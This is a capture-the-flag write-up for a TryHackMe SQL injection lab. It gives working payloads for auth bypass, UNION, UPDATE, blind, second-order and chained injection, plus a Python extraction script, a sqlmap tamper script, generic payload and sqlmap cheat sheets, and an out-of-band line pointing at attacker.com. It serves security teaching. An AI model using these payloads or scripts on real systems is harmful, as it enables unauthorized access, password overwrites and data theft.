# TryHackMe — SQL Injection Lab | Full Writeup & Cheat Sheet

> **Room:** [SQL Injection Lab](https://tryhackme.com/room/sqlilab)  
> **Difficulty:** Easy  
> **Tags:** SQLi, SQLMap, Web, Security  
> **DBMS:** SQLite  
> **Author:** Artem

---

## Table of Contents

- [Overview](#overview)
- [Task 3 — SQL Injection 1: Input Box Non-String](#task-3--sql-injection-1-input-box-non-string)
- [Task 3 — SQL Injection 2: Input Box String](#task-3--sql-injection-2-input-box-string)
- [Task 3 — SQL Injection 3: URL Injection](#task-3--sql-injection-3-url-injection)
- [Task 3 — SQL Injection 4: POST Injection](#task-3--sql-injection-4-post-injection)
- [Task 4 — SQL Injection 5: UPDATE Statement](#task-4--sql-injection-5-update-statement)
- [Task 5 — Broken Authentication 1](#task-5--broken-authentication-1)
- [Task 6 — Broken Authentication 2 (UNION + Cookie)](#task-6--broken-authentication-2-union--cookie)
- [Task 7 — Broken Authentication 3 (Blind Injection)](#task-7--broken-authentication-3-blind-injection)
- [Task 8 — Vulnerable Startup: Broken Auth (Notes — Second-Order)](#task-8--vulnerable-startup-broken-auth-notes--second-order)
- [Task 9 — Vulnerable Startup: Change Password (UPDATE Second-Order)](#task-9--vulnerable-startup-change-password-update-second-order)
- [Task 10 — Vulnerable Startup: Book Title (UNION via GET)](#task-10--vulnerable-startup-book-title-union-via-get)
- [Task 11 — Vulnerable Startup: Book Title 2 (Chained Injection)](#task-11--vulnerable-startup-book-title-2-chained-injection)
- [SQLi Type Reference](#sqli-type-reference)
- [Payload Cheat Sheet](#payload-cheat-sheet)
- [SQLMap Cheat Sheet](#sqlmap-cheat-sheet)
- [Lessons Learned](#lessons-learned)

---

## Overview

This room covers the full spectrum of SQL injection attacks — from basic authentication bypass to advanced second-order and chained injections. All challenges use **SQLite** as the backend database.

**Key Query (used across multiple challenges):**
```sql
SELECT uid, name, profileID, salary, passportNr, email, nickName, password
FROM usertable WHERE profileID=? AND password='?'
```

---

## Task 3 — SQL Injection 1: Input Box Non-String

**Type:** In-Band | Auth Bypass  
**Context:** `WHERE profileID=INTEGER`

The profileID parameter accepts an integer — no quotes needed.

**Payload:**
```
Profile ID: 1 OR 1=1-- -
Password:   (anything)
```

**Resulting query:**
```sql
SELECT ... FROM usertable WHERE profileID=1 OR 1=1-- - AND password='...'
```

`OR 1=1` always evaluates to true. `-- -` comments out the password check.

---

## Task 3 — SQL Injection 2: Input Box String

**Type:** In-Band | Auth Bypass  
**Context:** `WHERE profileID='STRING'`

The profileID is now wrapped in single quotes — we must close the quote.

**Payload:**
```
Profile ID: 1' OR '1'='1'-- -
Password:   (anything)
```

**Resulting query:**
```sql
SELECT ... FROM usertable WHERE profileID='1' OR '1'='1'-- -' AND password='...'
```

---

## Task 3 — SQL Injection 3: URL Injection

**Type:** In-Band | Auth Bypass via URL  
**Context:** Parameters are passed via GET (URL)

Client-side validation prevents injection through the form, but we can inject directly into the URL.

**Payload (URL-encoded):**
```
http://IP:5000/sesqli3/login?profileID=1'%20OR%20'1'='1'--%20-&password=test
```

The `%20` is a URL-encoded space. The browser automatically handles encoding when typed in the address bar.

---

## Task 3 — SQL Injection 4: POST Injection

**Type:** In-Band | Auth Bypass via POST  
**Context:** HTTP POST method with client-side JS validation

Client-side JavaScript validates the form. Two bypass methods:

**Method A — Disable JS:** Open DevTools (F12) → Debugger → Disable JavaScript  
**Method B — Burp Suite:** Intercept the POST request and modify the body:

```
profileID=1' OR '1'='1'-- -&password=test
```

---

## Task 4 — SQL Injection 5: UPDATE Statement

**Type:** In-Band | Subquery Data Extraction via UPDATE  
**Context:** `UPDATE usertable SET nickName='?', email='?' WHERE ...`  
**Credentials:** `10:toor`

The Edit Profile form updates nickName and email. Both fields are injectable. The key technique: use a **subquery** to write database contents into a visible field.

### Step 1 — Confirm injection (concatenation test)
```
nickName: test'||'concat
email:    (anything)
```
If the profile shows `testconcat` — injection confirmed.

### Step 2 — Identify DBMS
```
nickName: ',nickName=sqlite_version(),email='
```
Result: `3.22.0` → **SQLite confirmed**

### Step 3 — Enumerate tables
```
nickName: ',nickName=(SELECT group_concat(tbl_name) FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%'),email='
```
Result: `usertable,secrets`

### Step 4 — Enumerate columns (secrets table)
```
nickName: ',nickName=(SELECT sql FROM sqlite_master WHERE type!='meta' AND sql NOT NULL AND name ='secrets'),email='
```
Result: `CREATE TABLE secrets (id integer primary key, author integer not null, secret text not null)`

### Step 5 — Extract the flag
```
nickName: ',nickName=(SELECT group_concat(id || "," || author || "," || secret || ":") from secrets),email='
```

The flag appears in the nickName field on the profile page.

---

## Task 5 — Broken Authentication 1

**Type:** In-Band | Auth Bypass  
**Endpoint:** `/challenge1/`

### Payload that does NOT show the flag:
```
Username: ' OR 1=1 -- -
Password: (anything)
```
This logs in as "Unkown" — the first row in the table, which has no flag.

### Payloads that DO show the flag:

**Option A — Target admin directly:**
```
Username: admin' -- -
Password: (anything)
```

**Option B — Enumerate users first:**
```
Username: ' UNION SELECT 1,group_concat(username) FROM users -- -
Password: test
```
This reveals all usernames. Then log in as `admin` using Option A.

**Key lesson:** `OR 1=1` returns the first row — which may not be the account you need. Targeted injection (`admin' -- -`) or UNION enumeration is more reliable.

---

## Task 6 — Broken Authentication 2 (UNION + Cookie)

**Type:** In-Band | UNION-based Data Extraction via Flask Session Cookie  
**Endpoint:** `/challenge2/`

The flag is hidden in the database. The login form is still vulnerable, but now we need to **dump data**, not just bypass auth.

### Step 1 — Log in with UNION injection
```
Username: ' UNION SELECT 1,group_concat(password) FROM users -- -
Password: test
```

### Step 2 — Decode the Flask session cookie
1. Open DevTools (F12) → Application → Cookies
2. Copy the `session` cookie value
3. Decode it at: `https://www.kirsle.net/wizards/flask-session.cgi`

The decoded cookie contains all passwords. The flag is among them.

**Why it works:** The application stores the username from the query result in the session cookie. Our UNION injection replaced the username with `group_concat(password)` output.

---

## Task 7 — Broken Authentication 3 (Blind Injection)

**Type:** Blind Boolean-based  
**Endpoint:** `/challenge3/`

The same login vulnerability exists, but now there's **no visible output** — no cookie leakage, no username display. We can only observe: login success or failure.

### Step 1 — Determine password length
```
Username: admin' AND length((SELECT password FROM users WHERE username='admin'))==37 -- -
Password: admin
```
Login success → password length is 37.

### Step 2 — Extract password character by character
```
Username: admin' AND SUBSTR((SELECT password FROM users LIMIT 0,1),1,1)='T' -- -
Password: admin
```
Login success → first character is `T`. Repeat for each position.

### Step 3 — Automate with Python script

Available at: `http://MACHINE_IP:5000/view/challenge3/challenge3-exploit.py`

```python
#!/usr/bin/python3
import sys, requests, string

def send_p(url, query):
    payload = {"username": query, "password": "admin"}
    try:
        r = requests.post(url, data=payload, timeout=3)
    except requests.exceptions.ConnectTimeout:
        print("[!] ConnectionTimeout")
        sys.exit(1)
    return r.text

def main(addr):
    url = f"http://{addr}/challenge3/login"
    flag = ""
    password_len = 38
    for i in range(1, password_len):
        for c in string.ascii_lowercase + string.ascii_uppercase + string.digits + "{}":
            h = hex(ord(c))[2:]
            query = (
                "admin' AND SUBSTR((SELECT password FROM users LIMIT 0,1),"
                f"{i},1)=CAST(X'{h}' AS TEXT) -- "
            )
            resp = send_p(url, query)
            if "Invalid" not in resp:
                flag += c
                print(flag)
    print(f"[+] FLAG: {flag}")

if __name__ == "__main__":
    main(sys.argv[1])
```

```bash
python3 challenge3-exploit.py MACHINE_IP:5000
```

### Step 4 — Alternative: SQLMap
```bash
sqlmap -u http://MACHINE_IP:5000/challenge3/login \
  --data="username=admin&password=admin" \
  --level=5 --risk=3 \
  --dbms=sqlite \
  --technique=B \
  --dump
```

**SQLMap output explained:**
```
Parameter: username (POST)
    Type: boolean-based blind
    Payload: username=-6300' OR 3310=3310-- rrUJ&password=admin
```
- Random numbers (3310=3310) instead of 1=1 → WAF evasion
- Random suffix (`-- rrUJ`) → signature bypass
- Choose `[0] username` when prompted — it comments out the password check entirely

---

## Task 8 — Vulnerable Startup: Broken Auth (Notes — Second-Order)

**Type:** Second-Order UNION Injection  
**Endpoint:** `/challenge4/`  
**Injection point:** Registration (username) → Triggered on Notes page

The login form is now patched. Registration uses prepared statements. But the **Notes page** fetches notes using the stored username **without parameterization**.

### Manual exploitation

**Step 1 — Register with malicious username:**
```
Username: ' union select 1,group_concat(password) from users'
Password: asd
```

**Step 2 — Log in with the same credentials**

**Step 3 — Navigate to Notes page → flag appears**

### SQLMap with tamper script

Standard SQLMap fails because injection (signup) and result (notes) are on different pages.

**Tamper script (`so-tamper.py`):**
```python
import requests
from lib.core.enums import PRIORITY

__priority__ = PRIORITY.NORMAL

address = "http://MACHINE_IP:5000/challenge4"  # ← Change this
password = "asd"

def create_account(payload):
    with requests.Session() as s:
        s.get(f"{address}/signup")
        s.post(f"{address}/signup", data={
            "username": payload, "password": password
        })

def login(payload):
    with requests.Session() as s:
        s.get(f"{address}/login")
        s.post(f"{address}/login", data={
            "username": payload, "password": password
        })
        return s.cookies.get("session")

def tamper(payload, **kwargs):
    create_account(payload)
    cookie = login(payload)
    if cookie:
        kwargs["headers"]["Cookie"] = f"session={cookie}"
    return payload
```

**Setup:**
```bash
mkdir tamper
nano tamper/so-tamper.py    # paste the script above
touch tamper/__init__.py    # required for sqlmap to load the module
```

**SQLMap command:**
```bash
sqlmap --tamper tamper/so-tamper.py \
  --url http://MACHINE_IP:5000/challenge4/signup \
  --data "username=admin&password=asd" \
  --second-url http://MACHINE_IP:5000/challenge4/notes \
  -p username \
  --dbms sqlite \
  --technique=U \
  --no-cast \
  -T users --dump
```

| Flag | Purpose |
|------|---------|
| `--tamper` | Custom script: register + login before each payload |
| `--url .../signup` | Injection point (registration form) |
| `--second-url .../notes` | Where SQLMap reads the result |
| `--no-cast` | Prevents payload casting that breaks SQLite |
| `--technique=U` | UNION-based only |

---

## Task 9 — Vulnerable Startup: Change Password (UPDATE Second-Order)

**Type:** Second-Order UPDATE Injection  
**Endpoint:** `/challenge5/`  
**Injection point:** Registration (username) → Triggered on Change Password

The Notes page is now patched. A new Change Password function concatenates the username directly into the UPDATE query:

```sql
UPDATE users SET password='NEW_PASS' WHERE username='STORED_USERNAME'
```

### Exploitation

**Step 1 — Register with malicious username:**
```
Username: admin'-- -
Password: asd
```

**Step 2 — Log in as `admin'-- -`**

**Step 3 — Go to Profile → Change Password:**
```
New Password: hacked123
```

**What happens in the database:**
```sql
UPDATE users SET password='HASH(hacked123)' WHERE username='admin'-- -'
```
The `-- -` comments out the trailing quote. The WHERE clause targets the **real admin account**.

**Step 4 — Log out. Log in as:**
```
Username: admin
Password: hacked123
```

Flag is displayed after login.

---

## Task 10 — Vulnerable Startup: Book Title (UNION via GET)

**Type:** In-Band UNION via GET parameter  
**Endpoint:** `/challenge6/book?title=`

A book search function uses a GET parameter. The query uses `LIKE` with parentheses:
```sql
SELECT * FROM books WHERE title LIKE ('%USER_INPUT%')
```

### Step-by-step exploitation

**Step 1 — Confirm injection:**
```
/challenge6/book?title=test'
```

**Step 2 — Determine column count:**
```
/challenge6/book?title=test') ORDER BY 1-- -
/challenge6/book?title=test') ORDER BY 2-- -
/challenge6/book?title=test') ORDER BY 3-- -
/challenge6/book?title=test') ORDER BY 4-- -   ← OK
/challenge6/book?title=test') ORDER BY 5-- -   ← Error → 4 columns
```

**Step 3 — Find injectable columns:**
```
/challenge6/book?title=test') UNION SELECT 1,2,3,4-- -
```

**Step 4 — Extract the flag:**
```
/challenge6/book?title=test') UNION SELECT 1,group_concat(username),group_concat(password),4 FROM users-- -
```

**Note:** The `)` is needed to close the parenthesis in the LIKE clause before injecting the UNION.

---

## Task 11 — Vulnerable Startup: Book Title 2 (Chained Injection)

**Type:** Chained / Second-Order UNION Injection  
**Endpoint:** `/challenge7/book?title=`

This is the most complex challenge. The application runs **two sequential queries**:

```python
# Query 1: get book ID by title
bid = db.sql_query(f"SELECT id FROM books WHERE title like '{title}%'", one=True)

# Query 2: get full book info by ID
if bid:
    query = f"SELECT * FROM books WHERE id = '{bid['id']}'"
```

The result of Query 1 is fed into Query 2 **without sanitization**.

### Attack chain visualization

```
User Input → Query 1 (SELECT id) → returns controlled "id"
                                          ↓
                                    Query 2 (SELECT * WHERE id = 'controlled_value')
                                          ↓
                                    Results displayed on page
```

### Step-by-step exploitation

**Step 1 — Confirm injection:**
```
/challenge7/book?title=test'
```

**Step 2 — Control Query 1 output (1 column):**
```
/challenge7/book?title=' UNION SELECT 1-- -
```
Query 1 returns `1` as the ID. Query 2 looks for book with id = '1'.

**Step 3 — Inject into Query 2 through Query 1:**

We need to make Query 1 return a **payload string** that will execute as SQL in Query 2.

Query 2 has 4 columns (`SELECT * FROM books`), so our embedded UNION must match.

**Final payload:**
```
/challenge7/book?title=' UNION SELECT '1'' UNION SELECT 1,group_concat(username),group_concat(password),4 FROM users-- -'-- -
```

**How it breaks down:**

```sql
-- Query 1 receives:
SELECT id FROM books WHERE title like '' UNION SELECT '1'' UNION SELECT 1,group_concat(username),group_concat(password),4 FROM users-- -'%'

-- Query 1 returns the string: 1' UNION SELECT 1,group_concat(username),group_concat(password),4 FROM users-- -

-- Query 2 receives:
SELECT * FROM books WHERE id = '1' UNION SELECT 1,group_concat(username),group_concat(password),4 FROM users-- -'

-- UNION executes → data is displayed
```

**Note on quote escaping:** Inside the payload, `''` (two single quotes) represents a literal single quote in SQLite strings.

---

## SQLi Type Reference

| Type | What You See | Speed | Example |
|------|-------------|-------|---------|
| **In-Band (UNION)** | Data directly on page | Fast (1 request) | `' UNION SELECT 1,password FROM users-- -` |
| **In-Band (Error)** | Data in error messages | Fast (1 request) | `' AND extractvalue(1, concat(0x7e, version()))-- -` |
| **Blind (Boolean)** | Different behavior (true/false) | Slow (~70 req/char) | `' AND SUBSTR(password,1,1)='a'-- -` |
| **Blind (Time)** | Response delay | Very slow | `' AND IF(1=1, SLEEP(5), 0)-- -` |
| **Out-of-Band** | Data via DNS/HTTP | Depends | `'; exec xp_dirtree '\\attacker.com\test'-- -` |
| **Second-Order** | Stored → triggered later | Varies | Register as `admin'-- -` → change password |

---

## Payload Cheat Sheet

### Authentication Bypass
```sql
-- Integer context
1 OR 1=1-- -

-- String context
1' OR '1'='1'-- -

-- Target specific user
admin' -- -

-- Always true (with quote closure)
' OR 1=1 -- -
```

### UNION-based Extraction (SQLite)
```sql
-- Determine column count
' ORDER BY 1-- -
' ORDER BY 2-- -    -- increment until error

-- Identify visible columns
' UNION SELECT 1,2,3,4-- -

-- Database version
' UNION SELECT 1,sqlite_version(),3,4-- -

-- Enumerate tables
' UNION SELECT 1,group_concat(tbl_name),3,4 FROM sqlite_master WHERE type='table'-- -

-- Enumerate columns
' UNION SELECT 1,(SELECT sql FROM sqlite_master WHERE name='users'),3,4-- -

-- Dump data
' UNION SELECT 1,group_concat(username||':'||password),3,4 FROM users-- -
```

### UPDATE Statement Injection
```sql
-- Confirm injection (concatenation)
test'||'injected

-- Extract data into visible field
',nickName=(SELECT version()),email='

-- Enumerate tables (SQLite)
',nickName=(SELECT group_concat(tbl_name) FROM sqlite_master WHERE type='table' AND tbl_name NOT LIKE 'sqlite_%'),email='

-- Enumerate columns
',nickName=(SELECT sql FROM sqlite_master WHERE name='TARGET_TABLE'),email='

-- Extract data
',nickName=(SELECT group_concat(col1||','||col2) FROM target_table),email='
```

### Blind Boolean (SQLite)
```sql
-- Check password length
admin' AND length((SELECT password FROM users WHERE username='admin'))==37-- -

-- Extract character by character
admin' AND SUBSTR((SELECT password FROM users LIMIT 0,1),1,1)='a'-- -

-- Using hex comparison (case-sensitive)
admin' AND SUBSTR((SELECT password FROM users LIMIT 0,1),1,1)=CAST(X'61' AS TEXT)-- -
```

### Blind Time-based
```sql
-- MySQL
' AND IF(1=1, SLEEP(5), 0)-- -

-- PostgreSQL
' AND CASE WHEN (1=1) THEN pg_sleep(5) ELSE NULL END-- -

-- SQLite (no native sleep — use heavy query)
' AND CASE WHEN (1=1) THEN LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(100000000/2)))) ELSE 0 END-- -
```

---

## SQLMap Cheat Sheet

### Basic usage
```bash
# GET parameter
sqlmap -u "http://target/page?id=1" -p id --dbms=sqlite --dump

# POST parameter (from Burp request file)
sqlmap -r request.txt -p username --dbms=sqlite --dump

# POST parameter (inline)
sqlmap -u "http://target/login" --data="username=admin&password=test" -p username --dump
```

### Key flags
```bash
--level=5          # Test depth (1-5, default 1)
--risk=3           # Risk level (1-3). 3 = includes UPDATE/INSERT tests
--technique=BU     # B=Boolean, U=Union, T=Time, E=Error, S=Stacked
--dbms=sqlite      # Skip DBMS fingerprinting
--no-cast          # Disable payload casting (fixes SQLite issues)
--threads=5        # Parallel requests (faster blind extraction)
--batch            # Auto-answer prompts
--random-agent     # Random User-Agent header
--tamper=script.py # Custom tamper script
--second-url=URL   # Where to read second-order injection results
--dump             # Dump table contents
-T users           # Target specific table
```

### Second-order injection
```bash
sqlmap --tamper so-tamper.py \
  --url http://target/signup \
  --data "username=admin&password=asd" \
  --second-url http://target/notes \
  -p username \
  --dbms sqlite \
  --technique=U \
  --no-cast \
  --dump
```

---

## Lessons Learned

### Attack progression in this room

```
Task 3-4:   Direct injection → Auth bypass (SELECT WHERE)
Task 4:     UPDATE injection → Data extraction via subquery
Task 5-6:   Auth bypass → UNION extraction → Cookie leakage
Task 7:     Blind Boolean → Character-by-character extraction
Task 8:     Second-order → Injection at signup, trigger at notes
Task 9:     Second-order UPDATE → Password overwrite for account takeover
Task 10:    Classic UNION → GET parameter with LIKE clause
Task 11:    Chained injection → Two queries, payload passes through both
```

### Key takeaways

1. **Always test all input fields.** Forms, URL parameters, cookies, headers — anything that reaches the database is a potential injection point.

2. **Understand the SQL context.** Is your input inside SELECT, INSERT, UPDATE, or DELETE? The context determines which payloads will work.

3. **`OR 1=1` is not always enough.** It returns the first row, which may not be the target. Use targeted injection (`admin'-- -`) or UNION for precision.

4. **Second-order SQLi is the hardest to find.** Data is stored safely but used unsafely elsewhere. Automated scanners often miss this entirely.

5. **Chained queries multiply complexity.** When output from one query feeds into another, you must construct payloads that survive the entire chain.

6. **SQLMap needs help with non-standard flows.** Tamper scripts bridge the gap between SQLMap's expectations and real application behavior.

7. **DBMS identification changes everything.** SQLite, MySQL, PostgreSQL, and MSSQL all have different syntax for string concatenation, version queries, and system tables.

---

*Writeup by Artem | TryHackMe SQL Injection Lab | 2026*
